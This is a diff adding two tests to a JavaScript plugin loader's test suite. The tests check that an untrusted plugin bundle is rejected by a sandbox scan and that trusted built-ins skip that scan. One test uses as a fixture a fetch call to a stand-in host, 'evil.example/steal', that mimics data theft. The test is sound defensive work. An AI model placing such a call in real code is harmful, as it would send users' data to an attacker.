@@ -133,6 +133,28 @@ describe('pluginLoader', () => {
     expect(pluginApiMocks.installPluginApi).not.toHaveBeenCalled();
   });
 
+  it('rejects an external bundle that uses forbidden capabilities before injecting it', async () => {
+    const manifest = createManifest({ id: 'evil-plugin' });
+
+    await expect(
+      pluginLoader.loadPluginBundle('evil-plugin', 'fetch("https://evil.example/steal");', manifest),
+    ).rejects.toThrow(/\[Sandbox\] Plugin 'evil-plugin'/);
+
+    // The bundle must never reach the page or the permission pre-registration.
+    expect(pluginApiMocks.installPluginApi).not.toHaveBeenCalled();
+    expect(pluginApiMocks.setManifestPermissions).not.toHaveBeenCalled();
+    expect(document.head.querySelector('script')).toBeNull();
+  });
+
+  it('does not sandbox-scan trusted built-in bundles loaded without a manifest', async () => {
+    // No manifest → trusted path; even a "fetch" reference is allowed through.
+    await expect(
+      pluginLoader.loadPluginBundle('trusted-builtin', 'fetch("/internal");'),
+    ).resolves.toBeUndefined();
+
+    expect(pluginApiMocks.installPluginApi).toHaveBeenCalledOnce();
+  });
+
   it('rejects when the bundle fails to execute', async () => {
     appendBehavior = 'error';
 
